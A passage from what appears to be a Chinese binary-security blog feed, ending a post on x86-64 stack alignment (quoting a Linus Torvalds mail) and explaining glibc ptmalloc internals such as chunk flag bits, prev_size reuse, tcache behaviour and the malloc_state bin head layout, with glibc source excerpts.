bigger buffer that you <span class="keyword">do</span> that</span></span></span><br><span class="line">&gt; alignment inside).</span><br><span class="line"></span><br><span class="line">Side note: <span class="function">gcc <span class="title">can</span> <span class="params">(<span class="keyword">and</span> does)</span> actually generate forced alignment <span class="keyword">using</span></span></span><br><span class="line">&quot;and&quot; instructions on %rsp rather than assuming pre-existing</span><br><span class="line">alignment.  And that would be valid.</span><br><span class="line"></span><br><span class="line">The problem with <span class="string">&quot;alignof(16)&quot;</span> is <span class="keyword">not</span> that gcc couldn<span class="number">&#x27;</span>t generate the</span><br><span class="line">alignment itself, it<span class="number">&#x27;</span>s just the broken <span class="string">&quot;it&#x27;s already aligned to 16</span></span><br><span class="line"><span class="string">bytes&quot;</span> assumption because -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">3</span> doesn<span class="number">&#x27;</span>t work.</span><br><span class="line"></span><br><span class="line">You *could* <span class="keyword">try</span> to hack around it by forcing a <span class="number">32</span>-byte alignment</span><br><span class="line">instead. That (I think) will make gcc generate the <span class="string">&quot;and&quot;</span> instruction</span><br><span class="line">mess.</span><br><span class="line"></span><br><span class="line">And it shouldn<span class="number">&#x27;</span>t actually use any more memory than doing it by hand</span><br><span class="line">(by having twice the alignment <span class="keyword">and</span> hand-aligning the pointer).</span><br><span class="line"></span><br><span class="line">So we *could* <span class="keyword">try</span> to just have a really hacky rule saying that you can</span><br><span class="line">align <span class="built_in">stack</span> data to <span class="number">8</span> <span class="keyword">or</span> <span class="number">32</span> bytes, but *<span class="keyword">not</span>* to <span class="number">16</span> bytes.</span><br><span class="line"></span><br><span class="line">That said, I <span class="keyword">do</span> think that the <span class="string">&quot;don&#x27;t assume stack alignment, do it by</span></span><br><span class="line"><span class="string">hand&quot;</span> may be the safer thing. Because who knows what the random rules</span><br><span class="line">will be on other architectures.</span><br><span class="line"></span><br><span class="line">               Linus</span><br><span class="line">--</span><br></pre></td></tr></table></figure><p>由于没有调试kernel,所以我暂且把这里的call认为其包含syscall系统调用，所以在call函数之前，必须保证rsp对齐，否则就有可能出现不可预期的错误</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>64位下的pwn还是有很多需要注意的点，另外后面会尝试进一步调试kernel，看看syscall 0x38后到底是哪里由于rsp没有对齐造成了异常退出(估计多半也是像movaps之类的指令hh，权当猜测)</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ptmalloc机制闲扯</title>
      <link href="ptmalloc.html"/>
      <url>ptmalloc.html</url>
      
        <content type="html"><![CDATA[<h1 id="三个标志位"><a href="#三个标志位" class="headerlink" title="三个标志位"></a>三个标志位</h1><p>熟悉ptmalloc的都知道在ptmalloc分配的chunk header中的size部分有三bit标志位，分别为<code>NON_MAIN_ARENA</code>，<code>IS_MAPPED</code>，<code>PREV_INUSE</code>，这也算是ptmalloc的特征</p><p>分别讲讲这三个标志位吧，首先是<code>NON_MAIN_ARENA</code>，要讲这个标志位，那就要先知道什么是<code>main_arena</code>.</p><p>在ptmalloc中,<code>main_arena</code>指程序主线程所申请并占据的内存空间，一般这个值为132kb，ptmalloc在程序主线程启动后向内核申请长度为<code>132kb</code>的堆空间，并将此堆空间作为此程序的<code>main_arena</code>,由ptmalloc来对其进行管理</p><p>那么很显而易见的，<code>NON_MAIN_ARENA</code>指的就是当前堆块是否是在<code>main_arena</code>，0=no,1=yes</p><p>再来讲讲<code>IS_MAPPED</code>这个标志位，这个标志位也很明显，表示此堆块是否为<code>mmap</code>分配，0=no，1=yes</p><p>最后看看<code>PREV_INUSE</code>，乍一看是表示前一个堆块是否处于被allocated的状态，其实没错(笑)，就是这个意思，但要注意的一点是，这里指的前一个堆块是指物理地址上adajcent的堆块，而不是类似<code>fastbins</code>，<code>tcachebins</code>的链表上的堆块</p><p>另外<code>PREV_INUSE</code>也可以作为堆块合并的参照之一，当其为0时，chunk header中的<code>prev_size</code>就是有效的，系统可以通过<code>prev_size</code>的值获得前一块堆块的长度(为1时不可，原因下面会说)</p><h1 id="PREV-SIZE"><a href="#PREV-SIZE" class="headerlink" title="PREV_SIZE"></a>PREV_SIZE</h1><p>在chunk header中，除了三个标志位，还有一个地方需要关注，那就是第一个8(64位系统)字节的值，这个值代表了上一个堆块的长度，但是这个值仅当当前堆块的<code>PREV_INUSE</code>标志位为0时才有效</p><p>那么为啥<code>PREV_INUSE</code>为1时无效呢</p><p>主要是因为ptmalloc有一个特殊的机制，就是当前一个堆块处于allocated状态时，其可以“借用”当前堆块的<code>PREV_SIZE</code>所占据的空间(64位系统上为8字节)，这也是ptmalloc内存空间复用的一种手段，减少内存消耗</p><p>其实一开始我觉得很奇怪且无法理解，因为在64位系统上分配堆空间时，需要16字节对齐，而如果又可以借用8字节，那么岂不是违反了内存对齐的规定(其实是把自己绕进去了hh，现在写下来觉得自己挺傻的)</p><p>然而其实你可以把它看作一个约定，即分配堆空间时仍然遵循内存对齐的规则，但是也允许额外“溢出”一点空间，这里的溢出由ptmalloc保证不会出现异常</p><p>看个例子可能更好理解</p><p>这是一个结构体</p><p><img src="/image/ptmalloc/struct.jpg" alt="struct"></p><p>准备位这个结构体分配堆空间</p><p><img src="/image/ptmalloc/beforemalloc-code.jpg" alt="beforemalloc-code"></p><p>为这个结构体分配堆空间之前，tcache的情况</p><p><img src="/image/ptmalloc/beforemalloc-tcache.jpg" alt="beforemalloc-tcache"></p><p>分配堆空间之后，tcache的情况</p><p><img src="/image/ptmalloc/aftermalloc-tcache.jpg" alt="aftermalloc-tcache"></p><p>此时其实<code>msg_moduleinit</code>这个指针已经指向了位于<code>0x55555575ecb0</code>的堆空间(没截图，但从tcache上可以看出来)，但是，如果细心一点你会发现，<code>msg_moduleinit</code>的结构体类型应当占用的堆空间为<code>4+4+8+8+16=40</code>字节(16是chunk header的长度)</p><p>但是从tcache中我们可以看到位于<code>0x55555575ecb0</code>的堆空间只有0x20，32字节大小，那就很奇怪，咋少了8个字节呢？</p><p>不急，慢慢看下去</p><p>这是分配后，<code>msg_moduleinit</code>指向的堆空间情况</p><p><img src="/image/ptmalloc/oriheap.jpg" alt="oriheap"></p><p>跟进<code>unpack_moduledatainitreq_mess</code>函数</p><p><img src="/image/ptmalloc/unpack.jpg" alt="unpack"></p><p>这里将<code>msg_moduleinit</code>传入了<code>unpack_moduledatainitreq_mess</code>函数</p><p>跟进<code>unpack_moduledatainitreq_mess</code>函数</p><p><img src="/image/ptmalloc/unpack-1.jpg" alt="unpack-1"></p><p>可以看到这里一波操作，将<code>ntohl(*(uint32_t *)statusBuff)</code>的值赋给了mess结构体的Status(就是<code>msg_moduleinit</code>的<code>Status</code>，为了叙述方便，后面改用<code>msg_moduleinit</code>来指代)</p><p>之后继续看下去</p><p><img src="/image/ptmalloc/unpack-2.jpg" alt="unpack-2"></p><p>又是一波操作，将值赋给了<code>msg_moduleinit</code>的<code>ModuleNameLen</code></p><p>此时<code>msg_moduleinit</code>所指向的堆空间已经变为了如下这样</p><p><img src="/image/ptmalloc/firstchange.jpg" alt="firstchange"></p><p>可以看到低位的八个字节已经被重新赋值为了新的<code>Status</code>以及<code>ModuleNameLen</code>的值(分别为十进制的1和13)</p><p>继续</p><p><img src="/image/ptmalloc/unpack-3.jpg" alt="unpack-3"></p><p>操作一波，将<code>moduleNameBuff</code>所指向的地址赋值给<code>msg_moduleinit</code>的<code>ModuleName</code>指针</p><p>此时<code>msg_moduleinit</code>所指向的堆空间已经变为了如下这样</p><p><img src="/image/ptmalloc/secondchange.jpg" alt="secondchange"></p><p>可以看到<code>0x55555575ecb8</code>-<code>0x55555575ecc0</code>的八个字节已经被赋值为了<code>moduleNameBuff</code>所指向的地址</p><p>到这里，ptmalloc分配的0x20长度的堆空间已经霍霍完了，但是还有一个Size(占8个字节)无处安放，那它会被放在哪里呢？</p><p>Move on</p><p><img src="/image/ptmalloc/unpack-4.jpg" alt="unpack-4"></p><p>可以看到这里操作了一波，将<code>htobe64(*(uint64_t *)sizeBuff)</code>的值赋给了<code>msg_moduleinit</code>的<code>Size</code></p><p>此时<code>msg_moduleinit</code>指向的堆空间如下</p><p><img src="/image/ptmalloc/final.jpg" alt="final"></p><p>可以看见，代表<code>msg_moduleinit</code>的<code>Size</code>的八个字节，“溢出”了原本ptmalloc分配给<code>msg_moduleinit</code>的0x20长度，占据了下一个堆块的<code>prev_size</code>的空间，奇特，但合法 XD</p><p>并且，哪怕将<code>msg_moduleinit</code>给free了之后，被“溢出”的8个字节也并不会变为原本应该标示的，<code>msg_moduleinit</code>所指向的堆块的长度(即<code>prev_size</code>本身应该表示的东西)</p><p><img src="/image/ptmalloc/afterfree.jpg" alt="afterfree"></p><p>上图中53行已经free掉了<code>msg_moduleinit</code>，free完之后，<code>msg_moduleinit</code>所指向的堆空间以及其后一个堆空间的情况如下图所示</p><p><img src="/image/ptmalloc/nah.jpg" alt="nah"></p><p>可以看到，<code>msg_moduleinit</code>所指向的堆空间的下一个堆空间的<code>prev_size</code>并没有在<code>msg_moduleinit</code>被释放后被修改为<code>msg_moduleinit</code>所指向的堆空间的长度，而是仍然保持值“溢出”时<code>0x00000000000032b0</code>的值</p><p>然而按规定，当前一个堆块被free后，当前堆块的<code>prev_size</code>应该要变为前一个堆块的长度，且将<code>PREV_INUSE</code>置零</p><p>出现这种现象是因为<code>tcachebins</code>与<code>fastbins</code>有一个特点，就是放入这两个bins的堆块不会被标记为空闲，<code>PREV_INUSE</code>不会被置零，而是一直保持着allocated的状态，并且也不会主动合并空闲堆块</p><p>从tcache的情况也可以看出这个特点</p><p><img src="/image/ptmalloc/aaa.jpg" alt="aaa"></p><p>可以看到，虽然<code>0x55555575ecb0</code>和<code>0x55555575ecd0</code>这两个堆块物理上相邻，且<code>0x55555575ecb0</code>刚刚被释放(就是<code>msg_moduleinit</code>所指向的堆块),但是此时<code>0x55555575ecd0</code>堆块上的<code>PREV_INUSE</code>标志位仍然置1，而不是我们想象中的0</p><p>所以这里被“溢出”的，本来表示前一堆块的<code>prev_size</code>的值并没有改变，而是继续保留原来“溢出”后的值</p><h1 id="头chunk"><a href="#头chunk" class="headerlink" title="头chunk"></a>头chunk</h1><p>除了fastbins以及tcachebins以外，small、big、unsorted这几个bins都是由双向链表组成的，而双向链表的头chunk结构当然也需要研究一番</p><p>首先bins的所有状态都会被记录在<code>malloc_state</code>这个结构体中，结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>]; <span class="comment">// NBINS=128</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内存中<code>malloc_state</code>部分分布状况：</p><p><img src="/image/ptmalloc/mallocstatemem.jpg" alt="mallocstatemem"></p><p>根据结构体构成来看</p><ol><li><p><code>0x7ffff7dcfc40</code>-<code>0x7ffff7dcfc48</code>为<code>__libc_lock_define (, mutex)</code>占据,该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</p></li><li><p><code>0x7ffff7dcfc48</code>-<code>0x7ffff7dcfc4b</code>为<code>flag</code>,其记录了分配区的一些标志，比如 <code>bit0</code>记录了分配区是否有<code>fast bin chunk</code>，<code>bit1</code>标识分配区是否能返回连续的虚拟地址空间。具体如下</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p><code>0x7ffff7dcfc4b</code>-<code>0x7ffff7dcfc50</code>为<code>have_fastchunks</code></p></li><li><p><code>0x7ffff7dcfc50</code>-<code>0x7ffff7dcfca0</code>为<code>fastbins</code>的头节点数组,理论上<code>fastbins</code>中拥有10个bins，但现在只使用了7个(<code>0x7ffff7dcfc50</code>-<code>0x7ffff7dcfc88</code>)</p></li><li><p><code>0x7ffff7dcfca0</code>-<code>0x7ffff7dcfca8</code>为<code>top chunk</code>的起始地址</p></li><li><p><code>0x7ffff7dcfca8</code>-<code>0x7ffff7dcfcb0</code>为<code>last remainder</code>的起始地址</p></li><li><p><code>0x7ffff7dcfcb0</code>之后则为bins数组，里面存储了所有small、big、unsorted bins的头节点信息</p></li></ol><p>这里要注意一点就是，这里的头节点与可分配的堆块节点不同，这里的头节点只是双向链表的起点，在malloc的时候分配的都是头节点指向的下一个节点及之后的节点，头节点永远指向可分配堆块的第一块以及最后一块</p><p>此时unsortedbins的情况：</p><p><img src="/image/ptmalloc/unsortedbins.jpg" alt="unsortedbins"></p><p>这里还要注意的一个地方就是，unsortedbins占据bin数组的下标为0处(索引为1)，即<code>0x7ffff7dcfcb0</code>-<code>0x7ffff7dcfcc0</code></p><p>small bins占据62个，largebins占据63个</p><p>可以从上图以及<code>malloc_state</code>分布状况中看出，unsortedbins头节点已经标示了第一个待分配堆块的地址<code>0x0000555555756870</code>，同时标示了最后一个待分配堆块的地址<code>0x0000555555756250</code></p><p>综上可以看出，每一条bins链的头节点结构与普通的堆块节点结构是不相同的，这里有一个解释( <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk</a> ),但我私以为其中的解释有些许绕，并且也不是<code>prev_size</code>和<code>size</code>重用的问题</p><p>同时如果仔细查看<code>mchunkptr</code>的定义，就可以发现<code>mchunkptr</code>实际上就是指向结构malloc_chunk的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以头节点的构造与普通堆块的构造本来就不相同，每一个头节点只是由两个指针组成，普通堆块的<code>prev_size</code>以及<code>size</code>这两个区域在头节点这里本身就没有实现。</p><p>所以如果要操作头节点，务必不能误以为其结构与普通堆节点相同，从而去操作其<code>prev_size</code>以及<code>size</code>的值，因为从内存分布的角度来看，头节点的<code>prev_size</code>和<code>size</code>实际上是<code>top chunk</code>以及<code>last remainder</code>的内存位置(unsortedbins)，或者就是前一条bin链的头节点结构(small、largebins)，随意操作将会导致<code>malloc_state</code>结构错乱，发生不可预期的错误</p><h2 id="附记"><a href="#附记" class="headerlink" title="附记"></a>附记</h2><p>针对头chunk部分中我质疑 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk</a> 中的解释，在我详细查看了glbc源代码后，我发现实际上原链接讲的有一定的道理，只是他说的比较绕，让人有点难以理解</p><p>我先用几句话总结一下头chunk的问题，然后再给出一个直观的例子来解释其中的逻辑</p><ul><li>头chunk确实在<code>malloc_state</code>这个结构体中被定义为指针数组，这是没有错的，即我上面<code>每一个头节点只是由两个指针组成</code>是没有错的</li><li>头chunk虽然是只由两个指针组成，但是在实际glibc的代码中，却把头chunk“视作”与<code>malloc_chunk</code>具有相同的结构</li></ul><p>可能这两句话不是很好理解，接下来我给一个直观的例子</p><p>在glbc源代码中，得到一个bin的头chunk的地址是通过<code>bin_at</code>这个宏得到的，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd)) <span class="comment">// offsetof是一个宏，用来计算fd在结构体malloc_chunk中的相对偏移</span></span><br></pre></td></tr></table></figure><p>对于<code>unsortedbins</code>来说，得到<code>unsortedbins</code>头chunk的地址，就是如下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1)) <span class="comment">// M为arena，这里我们默认为main_arena</span></span></span><br></pre></td></tr></table></figure><p>此时<code>malloc_state</code>结构体在内存中的情况如下所示</p><p><img src="/image/ptmalloc/unsorted.jpg" alt="unsorted"></p><p>那么让我们来算一下<code>bin_at(M,1)</code>的值</p><p>按照<code>bin_at</code>宏的计算方法，我们可以很轻易的计算出其返回值是<strong>0x7ffff7dcfca0</strong>,并且请注意一点，就是在<code>bin_at</code>中使用了<code>(mbinptr)</code>，将最后这个地址被强制转换为了一个<code>mbinptr</code>类型的指针，并且这个指针指向的应当是<strong>一个malloc_chunk结构体变量</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么也就是说，当我们要找<code>unsortedbins</code>的起始地址时，<code>bin_at</code>给我们的结果，不是我们以为的<strong>0x7ffff7dcfcb0</strong>这个地址，而是相差了16个字节的<strong>0x7ffff7dcfca0</strong></p><p>挺奇怪的，但是当我看到下面这两个宏的使用，我就明白了这个奇怪的返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>这里的<code>first</code>和<code>last</code>两个宏，一个是用来取bin中第一个堆块的地址，另一个是取最后一个堆块的地址，而参数b就是<code>bin_at</code>这个宏返回的结果</p><p>如果我们把<strong>0x7ffff7dcfca0</strong>这个地址带入，由于其是一个<strong>指向一个malloc_chunk结构体变量</strong>的指针，所以按照<code>malloc_chunk</code>的结构，<code>((b)-&gt;fd)</code>恰好就是我们需要的<code>0x00005555557563d0</code>值</p><p>发现什么了嘛？这说明，实际上glibc中同样将头chunk视作普通的chunk，只是这个头chunk比较特殊</p><p>由于头chunk中不需要存储<code>mchunk_prev_size</code>、<code>mchunk_size</code>、<code>fd_nextsize</code>、<code>bk_nextsize</code>这四个成员，仅仅只需要存储指向头尾两个节点的指针即可，所以头chunk中，可以将前一个头chunk的<code>fd_nextsize</code>，<code>bk_nextsize</code>与后一个头chunk的<code>mchunk_prev_size</code>、<code>mchunk_size</code>所占据的16字节长的空间合并，同时将后一个头chunk整体上移至合并的区域，就像下面这样</p><p>合并前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; topchunk ptr所在的位置同时也可以视作unsorted bins真正的头起始处</span><br><span class="line">&#x2F;&#x2F; 也即unsortedchunk的mchunk_prev_size这个成员的起始地址</span><br><span class="line">&#x2F;&#x2F; 